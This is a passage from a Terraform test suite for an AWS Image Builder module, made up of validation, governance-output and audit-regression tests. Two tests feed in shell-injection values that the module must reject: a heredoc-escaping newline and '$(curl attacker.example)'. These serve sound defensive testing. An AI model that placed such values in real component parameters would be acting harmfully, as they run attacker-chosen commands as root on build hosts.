  command = plan

  variables {
    sns_topic_arn    = "arn:aws:sns:eu-west-1:111122223333:image-builds"
    notify_on_states = ["FAILED", "AVAILABLE"]
  }

  assert {
    condition = length(
      jsondecode(aws_cloudwatch_event_rule.image_state[0].event_pattern).detail.state.status
    ) == 2
    error_message = "both requested states must appear in the event pattern."
  }
}

# ---------------------------------------------------------------------------
# The governance output — the posture, as data
# ---------------------------------------------------------------------------

run "the_governance_output_reports_a_defensible_default_posture" {
  command = plan

  assert {
    condition = alltrue([
      output.governance.parent_image_pinned,
      output.governance.snapshots_encrypted_if_root_device_matches_parent,
      output.governance.image_tests_enabled,
      output.governance.imds_v2_required,
      output.governance.terminates_on_failure,
      output.governance.build_logs_persisted,
      output.governance.lifecycle_policy_enabled,
      output.governance.lifecycle_deletes_amis,
      # NOT rebuilds_only_on_change: that reports the dependency-updates start
      # condition, which with a pinned parent means the schedule never fires.
      # schedule_can_fire is the field that actually matters.
      output.governance.schedule_can_fire,
      output.governance.component_versions_retained,
    ])
    error_message = "the default posture must be defensible on every field a reviewer would check."
  }

  assert {
    condition = alltrue([
      output.governance.ami_is_public == false,
      length(output.governance.shared_with_accounts) == 0,
      length(output.governance.distributed_to_accounts) == 0,
    ])
    error_message = "nothing should be shared or published by default."
  }
}

# ---------------------------------------------------------------------------
# Input validation
# ---------------------------------------------------------------------------

run "an_invalid_name_is_rejected" {
  command = plan

  variables {
    name = "Test_Image"
  }

  expect_failures = [var.name]
}

run "reserved_tag_prefixes_are_rejected" {
  command = plan

  variables {
    tags = { "aws:cloudformation:stack" = "x" }
  }

  expect_failures = [var.tags]
}

run "an_empty_component_list_is_rejected" {
  command = plan

  variables {
    components = []
  }

  expect_failures = [var.components]
}

run "duplicate_component_names_are_rejected" {
  command = plan

  variables {
    components = [
      { name = "same", bundled = "install-docker" },
      { name = "same", bundled = "verify-image" },
    ]
  }

  expect_failures = [var.components]
}

run "a_malformed_subnet_id_is_rejected" {
  command = plan

  variables {
    subnet_id = "vpc-0123456789abcdef0"
  }

  expect_failures = [var.subnet_id]
}

run "an_empty_security_group_list_is_rejected" {
  command = plan

  variables {
    security_group_ids = []
  }

  expect_failures = [var.security_group_ids]
}

run "a_non_absolute_ssm_parameter_name_is_rejected" {
  command = plan

  variables {
    ami_ssm_parameter_name = "ami/test/latest"
  }

  expect_failures = [var.ami_ssm_parameter_name]
}

run "a_log_prefix_with_a_leading_slash_is_rejected" {
  command = plan

  variables {
    log_s3_prefix = "/imagebuilder"
  }

  expect_failures = [var.log_s3_prefix]
}

run "an_invalid_retention_period_is_rejected" {
  command = plan

  variables {
    log_retention_days = 45
  }

  expect_failures = [var.log_retention_days]
}

run "a_bad_launch_template_id_is_rejected" {
  command = plan

  variables {
    update_launch_template_ids = ["lt-not-hex-at-all"]
  }

  expect_failures = [var.update_launch_template_ids]
}

run "a_non_iam_policy_arn_in_additional_policies_is_rejected" {
  command = plan

  variables {
    additional_build_policy_arns = ["arn:aws:s3:::some-bucket"]
  }

  expect_failures = [var.additional_build_policy_arns]
}

run "an_out_of_range_imds_hop_limit_is_rejected" {
  command = plan

  variables {
    imds_hop_limit = 0
  }

  expect_failures = [var.imds_hop_limit]
}

run "a_root_volume_below_the_minimum_is_rejected" {
  command = plan

  variables {
    root_volume_size_gb = 4
  }

  expect_failures = [var.root_volume_size_gb]
}

run "additional_policies_are_attached_when_valid" {
  command = plan

  variables {
    additional_build_policy_arns = [
      "arn:aws:iam::111122223333:policy/read-internal-artifacts",
    ]
    # Required now: check "build_role_blast_radius_was_reviewed" refuses to stay
    # quiet about widening a root-capable role with no boundary.
    permissions_boundary_arn = "arn:aws:iam::111122223333:policy/platform-boundary"
  }

  assert {
    condition     = length(aws_iam_role_policy_attachment.build_additional) == 1
    error_message = "expected the additional policy to be attached to the build role."
  }
}


# Captures the baseline versions so the hash-coverage regressions below can
# assert that a version MOVED. That is the closest a mocked suite can get to
# testing replacement semantics, since mock_provider never reports
# RequiresReplace.
run "baseline_versions" {
  command = plan

  assert {
    condition     = output.recipe_version != ""
    error_message = "expected a resolved recipe version to compare against."
  }
}

# ---------------------------------------------------------------------------
# Regressions for the audit findings
#
# One run block per defect, each named for the finding. Every one of these
# passed - or did not exist - while the defect was live.
# ---------------------------------------------------------------------------

run "regression_lifecycle_selector_tag_is_on_the_imagebuilder_resource" {
  command = plan

  # The policy selected on SourceRecipe, which was only in ami_tags - an EC2
  # AMI tag. AWS evaluates resourceSelection.tagMap against the Image Builder
  # image resource and explicitly does NOT read the output AMI's tags, so the
  # policy matched zero images forever while reporting itself enabled.
  assert {
    condition     = aws_imagebuilder_image_pipeline.this[0].tags["SourceRecipe"] == "test-image"
    error_message = "the selector tag must be on the Image Builder resources, not only on the AMI, or the lifecycle policy matches nothing."
  }

  assert {
    condition     = aws_imagebuilder_image_recipe.this[0].tags["SourceRecipe"] == "test-image"
    error_message = "the recipe must carry the selector tag too."
  }
}

run "regression_deprecate_action_includes_the_amis" {
  command = apply

  # A DEPRECATE action with no include_resources deprecates only the Image
  # Builder image resource; describe-images keeps returning the AMI, so the
  # "stops someone picking last year's image" effect did not happen.
  assert {
    condition = alltrue(flatten([
      for d in aws_imagebuilder_lifecycle_policy.this[0].policy_detail : [
        for a in d.action : [for ir in a.include_resources : ir.amis] if a.type == "DEPRECATE"
      ]
    ]))
    error_message = "the DEPRECATE action must set include_resources.amis, or the AMI is never deprecated."
  }
}

run "regression_public_ami_exclusion_is_not_inverted" {
  command = apply

  variables {
    lifecycle_delete_after_days = 400
  }

  # is_public = true EXCLUDES public AMIs from the action. It was false, which
  # is the inverse of what the comment claimed and left a public AMI eligible
  # for deletion.
  assert {
    condition = alltrue(flatten([
      for d in aws_imagebuilder_lifecycle_policy.this[0].policy_detail : [
        for e in d.exclusion_rules : [for a in e.amis : a.is_public]
      ]
    ]))
    error_message = "exclusion_rules.amis.is_public must be true to EXCLUDE public AMIs from deletion."
  }
}

run "regression_shared_amis_are_exempt_from_deletion" {
  command = apply

  variables {
    lifecycle_delete_after_days = 400
    launch_permission           = { user_ids = ["444455556666"] }
  }

  # Accounts an AMI is shared with launch it without touching the owner's
  # last-launched metadata, so the recency exemption cannot protect it. Nothing
  # set shared_accounts at all.
  assert {
    condition = anytrue(flatten([
      for d in aws_imagebuilder_lifecycle_policy.this[0].policy_detail : [
        for e in d.exclusion_rules : [
          for a in e.amis : contains(coalesce(a.shared_accounts, []), "444455556666")
        ]
      ]
    ]))
    error_message = "an AMI shared with another account must be exempt from age-based deletion."
  }
}

run "regression_require_cmk_counts_the_build_region_key" {
  command = plan

  variables {
    kms_key_arn = "arn:aws:kms:eu-west-1:111122223333:key/12345678-1234-1234-1234-123456789012"
    require_cmk = true
    # Deliberately empty: this is the shipped gitlab-runner-manager shape, and
    # it used to fail the require_cmk precondition because regions_without_cmk
    # read only the distribution map.
    distribution_kms_key_arns = {}
  }

  assert {
    condition     = length(output.governance.regions_without_cmk) == 0
    error_message = "kms_key_arn must count as covering the build region, or require_cmk rejects the natural single-region configuration."
  }

  assert {
    condition     = output.governance.customer_managed_key
    error_message = "governance must report a customer-managed key when kms_key_arn is set. It previously reported false and regions_without_cmk = [] in the same object."
  }
}

run "regression_build_region_distribution_gets_the_cmk" {
  command = apply

  variables {
    kms_key_arn = "arn:aws:kms:eu-west-1:111122223333:key/12345678-1234-1234-1234-123456789012"
  }

  # kms_key_arn never reached ami_distribution_configuration.kms_key_id, so the
  # distributed AMI in the build region used the AWS-managed key.
  assert {
    condition = anytrue(flatten([
      for d in aws_imagebuilder_distribution_configuration.this[0].distribution : [
        for a in d.ami_distribution_configuration :
        a.kms_key_id == "arn:aws:kms:eu-west-1:111122223333:key/12345678-1234-1234-1234-123456789012"
      ] if d.region == "eu-west-1"
    ]))
    error_message = "the build region's distribution must use kms_key_arn."
  }
}

run "regression_component_version_moves_when_the_cmk_changes" {
  command = plan

  variables {
    kms_key_arn = "arn:aws:kms:eu-west-1:111122223333:key/12345678-1234-1234-1234-123456789012"
  }

  # kms_key_id is ForceNew on aws_imagebuilder_component and was NOT in the
  # hash input, so adding a CMK replaced the component with an unchanged
  # version. CreateComponent then fails on a version whose content did not
  # change, and retry cannot fix it.
  #
  # mock_provider cannot show the replacement, so assert the version instead.
  assert {
    condition     = output.recipe_version != run.baseline_versions.recipe_version
    error_message = "the recipe version must move when kms_key_arn changes; it is ForceNew on both the component and the recipe."
  }

  assert {
    condition     = output.component_versions["hardening"] != run.baseline_versions.component_versions["hardening"]
    error_message = "the component version must move when kms_key_arn changes, or CreateComponent collides on an existing version."
  }
}

run "regression_component_version_moves_when_the_description_changes" {
  command = plan

  variables {
    components = [
      { name = "hardening", bundled = "amazon-linux-hardening", description = "a different description" },
      { name = "docker", bundled = "install-docker", parameters = { DockerUser = "ec2-user" } },
      { name = "verify", bundled = "verify-image" },
    ]
  }

  assert {
    condition     = output.component_versions["hardening"] != run.baseline_versions.component_versions["hardening"]
    error_message = "component description is ForceNew, so it must be in the hash input."
  }
}

run "regression_recipe_version_moves_when_the_description_changes" {
  command = plan

  variables {
    description = "a different recipe description"
  }

  assert {
    condition     = output.recipe_version != run.baseline_versions.recipe_version
    error_message = "recipe description is ForceNew, so it must be in the hash input."
  }
}

run "regression_a_schedule_that_cannot_fire_is_rejected" {
  command = plan

  variables {
    # Pinned parent + content-derived component versions + the dependency-updates
    # start condition means no dependency can ever update, so the cron fires and
    # does nothing. Forever. While reporting a monthly cadence.
    pipeline_execution_start_condition = "EXPRESSION_MATCH_AND_DEPENDENCY_UPDATES_AVAILABLE"
  }

  expect_failures = [check.the_schedule_can_actually_fire]
}

run "regression_an_unpinned_parent_makes_the_schedule_viable_again" {
  command = plan

  variables {
    parent_image                       = "/aws/service/ami-amazon-linux-latest/al2023-ami-kernel-default-x86_64"
    allow_unpinned_parent_image        = true
    pipeline_execution_start_condition = "EXPRESSION_MATCH_AND_DEPENDENCY_UPDATES_AVAILABLE"
  }

  # The base image CAN update now, so the schedule is meaningful. Only the
  # pinning advisory should fire.
  expect_failures = [check.parent_image_is_reproducible]

  assert {
    condition     = output.governance.schedule_can_fire
    error_message = "with an unpinned parent the dependency-updates condition is satisfiable, so the schedule can fire."
  }
}

run "regression_governance_reports_a_schedule_that_can_fire" {
  command = plan

  assert {
    condition     = output.governance.schedule_can_fire
    error_message = "the baseline uses EXPRESSION_MATCH_ONLY, so the schedule can fire."
  }
}

run "regression_wildcard_parent_arns_are_caught_in_every_position" {
  command = plan

  variables {
    # The old guard substring-matched the literal "x.x.x", so a floating build
    # number was certified as pinned.
    parent_image = "arn:aws:imagebuilder:eu-west-1:aws:image/al2023/2024.5.20/x"
  }

  expect_failures = [
    aws_imagebuilder_image_recipe.this,
    check.parent_image_is_reproducible,
  ]
}

run "regression_a_partial_wildcard_parent_arn_is_caught" {
  command = plan

  variables {
    parent_image = "arn:aws:imagebuilder:eu-west-1:aws:image/al2023/2024.5.x/1"
  }

  expect_failures = [
    aws_imagebuilder_image_recipe.this,
    check.parent_image_is_reproducible,
  ]
}

run "regression_a_third_party_parent_image_is_reported" {
  command = plan

  variables {
    parent_image = "arn:aws:imagebuilder:eu-west-1:999988887777:image/somebody-elses/1.0.0/1"
  }

  # Pinned, but to an image this account does not own. Pinning alone was the
  # only thing governance reported.
  assert {
    condition     = output.governance.parent_image_owner == "third-party"
    error_message = "governance must distinguish a parent image owned by a third party from one owned by AWS or this account."
  }
}

run "regression_org_wide_sharing_is_visible_in_governance" {
  command = plan

  variables {
    launch_permission = {
      organization_arns        = ["arn:aws:organizations::111122223333:organization/o-abcdefghij"]
      organizational_unit_arns = ["arn:aws:organizations::111122223333:ou/o-abcdefghij/ou-ab12-cdefgh34"]
    }
  }

  # These appeared in NO governance field, so an AMI shared with an entire
  # organization reported as shared with nobody - and the module's own
  # "nothing shared by default" test passed on it.
  assert {
    condition     = length(output.governance.shared_with_organizations) == 1
    error_message = "an org-wide share must be visible in governance."
  }

  assert {
    condition     = length(output.governance.shared_with_organizational_units) == 1
    error_message = "an OU share must be visible in governance."
  }
}

run "regression_a_malformed_organization_arn_is_rejected" {
  command = plan

  variables {
    launch_permission = {
      organization_arns = ["o-abcdefghij"]
    }
  }

  expect_failures = [var.launch_permission]
}

run "regression_event_rule_uses_the_documented_detail_type" {
  command = plan

  variables {
    sns_topic_arn = "arn:aws:sns:eu-west-1:111122223333:image-builds"
  }

  # It was "EC2 Image Builder State Change" - one word short of the documented
  # type - so the rule matched nothing while looking configured.
  assert {
    condition = jsondecode(aws_cloudwatch_event_rule.image_state[0].event_pattern).detail-type == [
      "EC2 Image Builder Image State Change"
    ]
    error_message = "the detail-type must be the documented \"EC2 Image Builder Image State Change\"."
  }
}

run "regression_event_rule_is_scoped_to_this_pipeline" {
  command = plan

  variables {
    sns_topic_arn = "arn:aws:sns:eu-west-1:111122223333:image-builds"
  }

  # With no resources filter the rule fired on every pipeline in the account,
  # while the message hardcoded this pipeline's name and log group.
  assert {
    condition = length(
      jsondecode(aws_cloudwatch_event_rule.image_state[0].event_pattern).resources
    ) == 1
    error_message = "the event pattern must be scoped to this pipeline's images."
  }
}

run "regression_event_transformer_reads_paths_the_event_actually_has" {
  command = apply

  variables {
    sns_topic_arn = "arn:aws:sns:eu-west-1:111122223333:image-builds"
  }

  # $.detail.arn and $.detail.name are not in the event. The ARN is in
  # top-level resources[].
  assert {
    condition = alltrue([
      for t in aws_cloudwatch_event_target.image_state[0].input_transformer :
      t.input_paths["arn"] == "$.resources[0]"
    ])
    error_message = "the ARN must come from $.resources[0]; $.detail.arn does not exist."
  }

  assert {
    condition = alltrue([
      for t in aws_cloudwatch_event_target.image_state[0].input_transformer :
      !contains(keys(t.input_paths), "name")
    ])
    error_message = "$.detail.name does not exist in the event and must not be read."
  }

  assert {
    # An AWSTOE failure reason contains quotes and newlines, which EventBridge
    # does not escape - so including it made the payload invalid JSON and the
    # notification was dropped by the very condition it reported.
    condition = alltrue([
      for t in aws_cloudwatch_event_target.image_state[0].input_transformer :
      !contains(keys(t.input_paths), "reason")
    ])
    error_message = "the failure reason must not be interpolated into the JSON template unescaped."
  }
}

run "regression_the_snapshot_check_tracks_deletion_not_policy_existence" {
  command = plan

  variables {
    # A policy exists, but deletes nothing. The check used to assert
    # create_lifecycle_policy and passed here - while its own error message
    # described exactly this situation.
    lifecycle_delete_after_days = 0
  }

  expect_failures = [check.snapshots_do_not_accumulate_forever]
}

run "regression_deletion_is_enabled_by_default" {
  command = plan

  assert {
    condition     = output.governance.lifecycle_deletes_amis
    error_message = "a lifecycle policy that deletes nothing costs nothing and saves nothing; deletion is now on by default at a long horizon."
  }

  assert {
    condition     = output.governance.lifecycle_delete_after_days == 365
    error_message = "expected the 365-day default."
  }
}

run "regression_kms_endpoint_is_not_recommended_unconditionally" {
  command = plan

  # locals hardcoded "kms" while output.network_contract.notes said - in the
  # same object - that no KMS endpoint is needed. $8/AZ/month ordered on the
  # module's own authority.
  assert {
    condition = length([
      for e in output.network_contract.required_interface_endpoints : e if e == "kms"
    ]) == 0
    error_message = "the kms endpoint must not be recommended unless components_call_kms is set: EBS and SSM both call KMS service-side."
  }
}

run "regression_kms_endpoint_appears_when_a_component_needs_it" {
  command = plan

  variables {
    components_call_kms = true
  }

  assert {
    condition = length([
      for e in output.network_contract.required_interface_endpoints : e if e == "kms"
    ]) == 1
    error_message = "components_call_kms = true must add the kms endpoint to the contract."
  }
}

run "regression_log_grant_is_namespaced_even_with_no_prefix" {
  command = plan

  variables {
    log_s3_prefix = ""
  }

  # An empty prefix granted s3:PutObject on <bucket>/*, so a component - which
  # is arbitrary root code - could overwrite any other pipeline's build logs.
  assert {
    condition = alltrue([
      for s in jsondecode(aws_iam_role_policy.build[0].policy).Statement :
      s.Resource == ["arn:aws:s3:::my-imagebuilder-logs/imagebuilder/test-image/*"]
      if s.Sid == "PutBuildLogs"
    ])
    error_message = "the log write grant must be namespaced by pipeline name even when log_s3_prefix is empty."
  }
}

run "regression_additional_policies_respect_the_iam_quota" {
  command = plan

  variables {
    # 9 + the 2 the module attaches = 11, over IAM's default quota of 10. The
    # old limit was 10, and the error message said "two slots are already used".
    additional_build_policy_arns = [
      "arn:aws:iam::111122223333:policy/p1",
      "arn:aws:iam::111122223333:policy/p2",
      "arn:aws:iam::111122223333:policy/p3",
      "arn:aws:iam::111122223333:policy/p4",
      "arn:aws:iam::111122223333:policy/p5",
      "arn:aws:iam::111122223333:policy/p6",
      "arn:aws:iam::111122223333:policy/p7",
      "arn:aws:iam::111122223333:policy/p8",
      "arn:aws:iam::111122223333:policy/p9",
    ]
  }

  expect_failures = [var.additional_build_policy_arns]
}

run "regression_widening_the_build_role_without_a_boundary_warns" {
  command = plan

  variables {
    additional_build_policy_arns = ["arn:aws:iam::aws:policy/AdministratorAccess"]
    permissions_boundary_arn     = ""
  }

  # The widest knob on a role that runs arbitrary root code had no check at all,
  # while nine lower-impact things did.
  expect_failures = [check.build_role_blast_radius_was_reviewed]
}

run "regression_build_role_blast_radius_is_visible_in_governance" {
  command = plan

  variables {
    additional_build_policy_arns = ["arn:aws:iam::111122223333:policy/read-artifacts"]
    permissions_boundary_arn     = "arn:aws:iam::111122223333:policy/platform-boundary"
  }

  assert {
    condition     = length(output.governance.additional_build_policy_arns) == 1
    error_message = "extra build-role policies must be visible in governance."
  }

  assert {
    condition     = output.governance.permissions_boundary != ""
    error_message = "the permissions boundary must be visible in governance."
  }
}

run "regression_byo_profile_with_ignored_inputs_is_rejected" {
  command = plan

  variables {
    build_instance_profile_name = "platform-shared-profile"
    permissions_boundary_arn    = "arn:aws:iam::111122223333:policy/platform-boundary"
  }

  # With a BYO profile the module creates no role, so the boundary and any
  # extra policies were silently discarded and the plan stayed green.
  expect_failures = [aws_imagebuilder_infrastructure_configuration.this]
}

run "regression_io1_iops_ratio_is_validated" {
  command = plan

  variables {
    root_volume_type = "io1"
    # 30 GB caps io1 at 1500 IOPS. The 3000 default was accepted at plan and
    # rejected at build time.
  }

  expect_failures = [var.root_volume_iops]
}

run "regression_fast_launch_on_a_linux_image_is_rejected" {
  command = plan

  variables {
    fast_launch = { enabled = true }
  }

  # Windows-only in practice. On Linux it bills 5 pre-provisioned snapshots per
  # AMI for nothing - a 6x multiplier on the only cost line that grows.
  expect_failures = [var.fast_launch]
}

run "regression_recipe_user_data_is_sensitive" {
  command = plan

  variables {
    recipe_user_data = "#!/bin/bash\necho hello"
  }

  # cloud-init persists this into the image at
  # /var/lib/cloud/instances/<id>/user-data.txt, and nothing in the module was
  # marked sensitive, so it also sat in plan output and state in the clear.
  assert {
    condition     = output.recipe_version != ""
    error_message = "recipe_version must remain readable despite the sensitive user_data feeding its hash - nonsensitive() on the hash, not on the value."
  }
}

run "regression_verify_commands_cover_a_hung_build" {
  command = plan

  # The README predicts a hang as the first-run failure mode and the runbook
  # had no way to see it, stop it, or get onto the box.
  assert {
    condition = alltrue([
      can(output.verify_commands.find_build_instance),
      can(output.verify_commands.shell_on_build),
      can(output.verify_commands.cancel_stuck_build),
      can(output.verify_commands.why_no_build),
      can(output.verify_commands.snapshot_spend),
      can(output.verify_commands.is_inspector_enabled),
    ])
    error_message = "verify_commands must cover finding, entering and cancelling a hung build, plus the snapshot spend and the Inspector prerequisite."
  }
}

run "regression_governance_qualifies_the_encryption_claim" {
  command = plan

  variables {
    # AWS silently discards a mapping whose device_name does not match the
    # parent's root device - taking encryption with it - and Terraform cannot
    # see that. The old field was an unconditional `snapshots_encrypted = true`.
    root_device_name = "/dev/sda1"
  }

  # The parent has to agree, or the new root-device precondition rejects this
  # outright - which is itself the point of that guard.
  override_data {
    target = data.aws_ami.parent[0]
    values = {
      architecture     = "x86_64"
      root_device_name = "/dev/sda1"
    }
  }

  assert {
    condition     = output.governance.root_device == "/dev/sda1"
    error_message = "governance must expose the root device so the encryption claim can be checked against the parent image."
  }

  assert {
    condition     = output.governance.snapshots_encrypted_if_root_device_matches_parent
    error_message = "the encryption field must be named for what it actually guarantees."
  }
}

run "regression_moving_component_sources_are_reported" {
  command = plan

  # The bundled hardening and docker components run dnf with no version pin, so
  # a pinned parent alone does not make the image reproducible. governance
  # reported parent_image_pinned = true and nothing else.
  assert {
    condition     = output.governance.components_fetch_from_moving_sources
    error_message = "governance must admit that the bundled components fetch from moving sources."
  }
}


run "regression_a_root_device_mismatch_is_caught_at_plan" {
  command = plan

  # The trap: AWS discards a mapping whose device_name does not match the
  # parent's root device, taking encryption and volume size with it, and the
  # build still succeeds. Nothing in the module could see it before - which is
  # why the governance field had to be hedged rather than asserted.
  override_data {
    target = data.aws_ami.parent[0]
    values = {
      architecture     = "x86_64"
      root_device_name = "/dev/sda1"
    }
  }

  expect_failures = [aws_imagebuilder_image_recipe.this]
}

run "regression_an_architecture_mismatch_is_caught_at_plan" {
  command = plan

  # Failed ~2 minutes into a build as a generic Image Builder error before.
  override_data {
    target = data.aws_ami.parent[0]
    values = {
      architecture     = "arm64"
      root_device_name = "/dev/xvda"
    }
  }

  expect_failures = [aws_imagebuilder_image_recipe.this]
}

run "regression_matching_arm64_instance_types_are_accepted" {
  command = plan

  variables {
    instance_types = ["m7g.large", "m6g.large"]
  }

  override_data {
    target = data.aws_ami.parent[0]
    values = {
      architecture     = "arm64"
      root_device_name = "/dev/xvda"
    }
  }

  assert {
    condition     = output.governance.parent_image_architecture == "arm64"
    error_message = "an arm64 parent with Graviton instance types must be accepted, and the architecture reported."
  }
}

run "regression_parent_verification_can_be_disabled" {
  command = plan

  variables {
    verify_parent_image = false
  }

  assert {
    condition     = length(data.aws_ami.parent) == 0
    error_message = "verify_parent_image = false must not read the parent image."
  }

  assert {
    condition     = output.governance.parent_image_verified_at_plan == false
    error_message = "governance must report that the parent was not verified."
  }
}

run "regression_an_ssm_parent_is_not_read_as_an_ami" {
  command = plan

  variables {
    parent_image                = "/aws/service/ami-amazon-linux-latest/al2023-ami-kernel-default-x86_64"
    allow_unpinned_parent_image = true
  }

  # data.aws_ami cannot resolve an SSM path, so the guard must simply not run.
  expect_failures = [check.parent_image_is_reproducible]

  assert {
    condition     = length(data.aws_ami.parent) == 0
    error_message = "the parent-image data source must only be read for a plain AMI id."
  }
}

run "regression_build_timeout_shorter_than_the_test_timeout_is_rejected" {
  command = plan

  variables {
    build_on_apply              = true
    build_timeout               = "30m"
    image_tests_timeout_minutes = 120
  }

  # Terraform would abandon an in-flight build and the next apply would start a
  # second one concurrently against the same recipe.
  expect_failures = [aws_imagebuilder_image.this]
}

run "regression_the_one_shot_image_is_create_before_destroy" {
  command = plan

  variables {
    build_on_apply = true
    build_timeout  = "180m"
  }

  # DeleteImage does not delete the AMI or its snapshots, so a destroy-first
  # replacement left an untracked, billing AMI behind on every recipe change.
  assert {
    condition     = length(aws_imagebuilder_image.this) == 1
    error_message = "expected the one-shot image."
  }
}

run "regression_kms_create_grant_is_conditioned" {
  command = plan

  variables {
    kms_key_arn = "arn:aws:kms:eu-west-1:111122223333:key/12345678-1234-1234-1234-123456789012"
  }

  # Unconditioned CreateGrant lets a component create a persistent grant on the
  # estate's image key for a principal of its choosing, surviving the build.
  assert {
    condition = alltrue([
      for st in jsondecode(aws_iam_role_policy.build[0].policy).Statement :
      try(st.Condition.Bool["kms:GrantIsForAWSResource"], "") == "true"
      if st.Sid == "CreateGrantForEbsOnly"
    ])
    error_message = "kms:CreateGrant must be conditioned on kms:GrantIsForAWSResource."
  }

  assert {
    condition = length([
      for st in jsondecode(aws_iam_role_policy.build[0].policy).Statement :
      st if st.Sid == "UseCmkForImageSnapshots" && contains(st.Action, "kms:CreateGrant")
    ]) == 0
    error_message = "CreateGrant must be its own conditioned statement, not bundled with the unconditioned snapshot actions."
  }
}

run "regression_an_sse_kms_log_bucket_gets_a_key_grant" {
  command = plan

  variables {
    log_s3_kms_key_arn = "arn:aws:kms:eu-west-1:111122223333:key/abcdefab-1234-1234-1234-123456789012"
  }

  # Without this, PutObject succeeds at IAM and fails 403 at KMS, so log
  # delivery silently stops while the build reports success.
  assert {
    condition = length([
      for st in jsondecode(aws_iam_role_policy.build[0].policy).Statement :
      st if st.Sid == "EncryptBuildLogs" && contains(st.Action, "kms:GenerateDataKey")
    ]) == 1
    error_message = "an SSE-KMS log bucket needs GenerateDataKey on the BUCKET's key, not the EBS key."
  }
}

run "regression_key_policy_requirements_are_emitted" {
  command = plan

  variables {
    kms_key_arn        = "arn:aws:kms:eu-west-1:111122223333:key/12345678-1234-1234-1234-123456789012"
    log_s3_kms_key_arn = "arn:aws:kms:eu-west-1:111122223333:key/abcdefab-1234-1234-1234-123456789012"
    sns_topic_arn      = "arn:aws:sns:eu-west-1:111122223333:image-builds"
  }

  # The module cannot set a key policy, and each missing statement fails at a
  # different time - one of them by producing a log group that stays empty.
  assert {
    condition     = length(output.kms_key_policy_requirements) >= 4
    error_message = "expected key-policy requirements for the EBS key, the component documents, the log group and the log bucket key."
  }

  assert {
    condition = length([
      for r in output.kms_key_policy_requirements : r
      if can(regex("^logs\\.", r.principal))
    ]) == 1
    error_message = "the CloudWatch Logs key-policy requirement must be named: without it CreateLogGroup succeeds and every PutLogEvents fails."
  }
}

run "regression_no_key_policy_requirements_without_a_cmk" {
  command = plan

  assert {
    condition     = length(output.kms_key_policy_requirements) == 0
    error_message = "with no customer-managed key there is no key policy to write."
  }
}

run "regression_a_shell_metacharacter_in_a_parameter_is_rejected" {
  command = plan

  variables {
    components = [
      {
        name    = "verify"
        bundled = "verify-image"
        parameters = {
          # AWSTOE substitutes into the document text before bash sees it, so a
          # newline can terminate a heredoc early and run the rest as root.
          ForbiddenPaths = "/tmp/x\nEOF\necho pwned"
        }
      },
    ]
  }

  expect_failures = [var.components]
}

run "regression_a_command_substitution_in_a_parameter_is_rejected" {
  command = plan

  variables {
    components = [
      {
        name       = "verify"
        bundled    = "verify-image"
        parameters = { ForbiddenPaths = "$(curl attacker.example)" }
      },
    ]
  }

  expect_failures = [var.components]
}

run "regression_legitimate_space_separated_parameters_still_work" {
  command = plan

  variables {
    components = [
      {
        name       = "verify"
        bundled    = "verify-image"
        parameters = { ForbiddenPaths = "/root/.aws/credentials /etc/gitlab-runner/config.toml" }
      },
    ]
  }

  assert {
    condition     = length(aws_imagebuilder_component.this) == 1
    error_message = "the allowed character set must still admit every legitimate bundled value."
  }
}

run "regression_the_runner_component_requires_its_version_at_plan" {
  command = plan

  variables {
    components = [
      # No RunnerVersion. The component hard-fails at step one, four minutes
      # into a build. bundled is a closed set, so this belongs at plan time.
      { name = "gl", bundled = "install-gitlab-runner", parameters = { RepoScriptSha256 = "abc123" } },
    ]
  }

  expect_failures = [var.components]
}

run "regression_the_runner_component_requires_a_digest_at_plan" {
  command = plan

  variables {
    components = [
      { name = "gl", bundled = "install-gitlab-runner", parameters = { RunnerVersion = "17.5.3-1" } },
    ]
  }

  expect_failures = [var.components]
}

run "regression_a_bad_snapshot_id_is_rejected" {
  command = plan

  variables {
    additional_block_devices = [
      { device_name = "/dev/xvdb", size_gb = 100, snapshot_id = "not-a-snapshot" },
    ]
  }

  expect_failures = [var.additional_block_devices]
}

run "regression_a_non_region_kms_map_key_is_rejected" {
  command = plan

  variables {
    # Unvalidated keys were interpolated straight into the value regex, and a
    # typo'd key silently matched no region and contributed nothing.
    distribution_kms_key_arns = {
      "eu-west-1a" = "arn:aws:kms:eu-west-1:111122223333:key/12345678-1234-1234-1234-123456789012"
    }
  }

  expect_failures = [var.distribution_kms_key_arns]
}

run "regression_the_log_group_can_be_left_to_imagebuilder" {
  command = plan

  variables {
    create_log_group = false
  }

  # Image Builder auto-creates the group on first build, so a reused pipeline
  # name made this resource fail with ResourceAlreadyExistsException.
  assert {
    condition     = length(aws_cloudwatch_log_group.this) == 0
    error_message = "create_log_group = false must not create the group."
  }
}

run "regression_policy_attachments_are_keyed_by_arn_not_index" {
  command = plan

  variables {
    additional_build_policy_arns = [
      "arn:aws:iam::111122223333:policy/a",
      "arn:aws:iam::111122223333:policy/b",
    ]
    permissions_boundary_arn = "arn:aws:iam::111122223333:policy/platform-boundary"
  }

  # count.index re-indexed and churned every later attachment when a middle
  # entry was removed.
  assert {
    condition     = length(aws_iam_role_policy_attachment.build_additional) == 2
    error_message = "expected one attachment per policy ARN."
  }

  assert {
    # keys(), not can(): the resource object contains computed attributes and is
    # therefore unknown at plan, while the for_each keys are known.
    condition = contains(
      keys(aws_iam_role_policy_attachment.build_additional),
      "arn:aws:iam::111122223333:policy/a"
    )
    error_message = "attachments must be keyed by ARN so removing a middle entry does not churn the rest."
  }
}
